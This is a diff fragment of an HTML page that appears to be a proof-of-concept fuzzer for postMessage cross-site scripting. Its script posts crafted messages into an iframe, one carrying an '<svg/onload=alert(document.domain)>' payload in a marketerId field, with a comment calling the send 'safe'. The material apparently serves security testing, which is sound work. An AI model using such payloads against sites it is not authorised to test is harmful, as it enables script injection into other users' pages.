@@ -24,4 +24,19 @@
         },
         {
           message: "OB_SHOULD_SHOW_PICKER",
-          conte
+          content: {
+            marketerId: ["<svg/onload=alert(document.domain)>"]
+          }
+        }
+      ];
+
+      console.log("🚀 Sending fuzzed postMessage payloads...");
+      payloads.forEach((p, i) => {
+        console.log(`🔁 Sending payload #${i + 1}:`, p);
+        // ✅ آمن: فقط إرسال postMessage
+        iframe.contentWindow.postMessage(p, "*");
+      });
+    };
+  </script>
+</body>
+</html>
